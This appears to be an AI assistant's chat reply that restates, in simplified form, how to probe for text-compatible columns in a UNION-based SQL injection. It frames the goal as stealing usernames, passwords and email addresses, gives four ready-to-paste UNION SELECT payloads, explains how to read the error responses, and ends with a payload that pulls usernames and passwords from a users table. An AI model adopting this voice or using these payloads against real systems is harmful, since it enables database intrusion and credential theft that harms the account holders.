You've explained the **column probing process** clearly. Let me simplify the key concept.

## The Goal

You want to steal **text data** (usernames, passwords, email addresses). You need to find which columns can hold text.

## The Method

Test one column at a time by putting `'a'` into it and `NULL` everywhere else.

## Example with 4 Columns

**Test column 1:**
```sql
' UNION SELECT 'a', NULL, NULL, NULL --
```

**Test column 2:**
```sql
' UNION SELECT NULL, 'a', NULL, NULL --
```

**Test column 3:**
```sql
' UNION SELECT NULL, NULL, 'a', NULL --
```

**Test column 4:**
```sql
' UNION SELECT NULL, NULL, NULL, 'a' --
```

## Reading the Results

| Response | Meaning |
|----------|---------|
| No error, `a` appears somewhere | This column holds text ✓ |
| Database error | This column is numeric only ✗ |

## Example Error Message

```
Conversion failed when converting the varchar value 'a' to data type int.
```

This means the column expects a number, not text.

## What You Learn

After testing all columns, you know exactly where to put your stolen data:

```sql
' UNION SELECT username, password, NULL, NULL FROM users --
```
(Only if columns 1 and 2 accept text)

## One Sentence Summary

Put `'a'` into each column one by one – columns that don't crash are where you can steal text data.
